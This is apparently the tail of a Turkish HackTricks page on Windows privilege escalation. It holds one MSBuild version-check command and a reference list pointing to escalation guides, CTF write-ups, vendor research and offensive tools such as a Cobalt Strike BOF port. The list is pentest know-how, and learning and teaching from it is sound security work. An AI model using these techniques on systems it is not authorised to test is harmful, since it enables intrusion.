Projeyi doğru .NET sürümü kullanarak derlemelisiniz ([bakınız](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Hedef sistemde yüklü olan .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referanslar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
